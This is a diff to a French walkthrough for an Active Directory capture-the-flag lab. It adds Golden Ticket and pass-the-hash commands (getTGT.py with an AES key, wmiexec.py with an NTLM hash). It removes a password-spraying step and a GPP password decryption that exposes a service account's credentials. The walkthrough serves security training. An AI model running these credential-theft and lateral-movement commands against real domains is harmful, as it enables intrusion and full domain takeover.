@@ -412,65 +412,25 @@ Après avoir extrait le hash NTLM du compte krbtgt du domaine mgm.local lors du 
 
 Votre mission pour ce niveau consiste à utiliser l’outil Mimikatz (ou Rubeus, selon votre préférence) pour générer un TGT factice et l’injecter dans votre session. Grâce à ce Golden Ticket, vous pourrez ensuite accéder à n’importe quel serveur du domaine MGM, extraire des secrets, créer des comptes persistants ou simplement naviguer librement dans l’infrastructure AD. Vous êtes extrêmement proches de la compromission totale de l’AD MGM Grand.
 
+La commande suivante permet de générer un ticket kerberos à partir de cette clé aeskey 
+
+```shell
+    getTGT.py -aesKey 633c7562bd5ba07fe8c4c1377e425b7f2321b888d1062a3eea6faa56c699bdb8 ROME.LOCAL/Administrator
+```
+
+Note : on peut aussi se connecter via WMI directement en faisant un PASS THE HASH
+```shell
+    wmiexec.py ROME.LOCAL/Administrator@10.10.10.168 -hashes :d6f22bdacd93357020c9ecc5eb0fd329
+```
+
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Level 9 (AD Mirage) : reconaissance du troiseme AD
-
-!!! Fournir liste users.txt et password.txt !!!
-
-nxc smb 10.1.3.1 -u users.txt -p passwords.txt -t 16
-=> Resultat attendu SMB         10.1.3.1        445    WINDOWS-7HBD3FQ  [+] mirage.local\FrankCatton:P@ssw0rd 
-
-Il peut maintenant se connecter au paratge SMB et regarder les informations .....
+Level 9 (AD Mirage) : Exploitation des mots de passe GPP (Group Policy Preferences)
 
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Level 10 (AD Mirage) : Exploitation des mots de passe GPP (Group Policy Preferences)
-
-Connexion au paratge SMB du 3 eme AD avec le compte recupere
-Liste les repertoires sur le partage
-
-exegol-ad /workspace # smbmap -H "10.1.3.1" -d mirage.local -u 'FrankCatton' -p 'P@ssw0rd' 
-
-Resultat attendu : 
-
-                                                                                                                                                                │·················································
-[+] IP: 10.1.3.1:445    Name: 10.1.3.1                  Status: Authenticated                                                                                   │·················································
-        Disk                                                    Permissions     Comment                                                                         │·················································
-        ----                                                    -----------     -------                                                                         │·················································
-        ADMIN$                                                  NO ACCESS       Remote Admin                                                                    │·················································
-        C$                                                      NO ACCESS       Default share                                                                   │·················································
-        IPC$                                                    READ ONLY       Remote IPC                                                                      │·················································
-        NETLOGON                                                READ ONLY       Logon server share                                                              │·················································
-        SYSVOL                                                  READ ONLY       Logon server share  
-
-
-Il peut aller dans sysvol il lit les choses interessantes ....
-
-cd mirage.local\Policies\{12345678-1234-1234-1234-123456789ABC}\Machine\Preferences\Groups\ 
-
-smb: \mirage.local\Policies\{12345678-1234-1234-1234-123456789ABC}\Machine\Preferences\Groups\> ls                                                              │·················································
-  .                                   D        0  Thu Jun  5 15:36:29 2025                                                                                      │·················································
-  ..                                  D        0  Thu Jun  5 15:36:29 2025                                                                                      │·················································
-  Groups.xml                          A      531  Thu Jun  5 15:36:29 2025                                                                                      │·················································
-
- get Groups.xml 
-
- [Jun 05, 2025 - 14:05:00 (CEST)] exegol-ad /workspace # ls | grep Gro                                                                                           │·················································
-Groups.xml                                                                                                                                                      │·················································
-[Jun 05, 2025 - 14:05:06 (CEST)] exegol-ad /workspace #   
-
-gpp-decrypt.py -f Groups.xml  
-
-Il recupere le password avec le compte
-
-[ * ] Username: svc-backup                                                                                                                                      │·················································
-[ * ] Password: GPPstillStandingStrong2k18   
-                                                                             
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-Level 11 (AD Mirage) : Escalade de privilèges vi un chemin sans quotes
+Level 10 (AD Mirage) : Escalade de privilèges vi un chemin sans quotes
 
 Script pour histoire du niveau :
 
@@ -508,6 +468,9 @@ Copy-Item "C:\Program.exe" -Destination "C:\Program Files\Some Folder\Program.ex
 Redémarrer le service vulnérable
 Restart-Service -Name "VulnerableService"
 
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Level 11:
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Level 12:
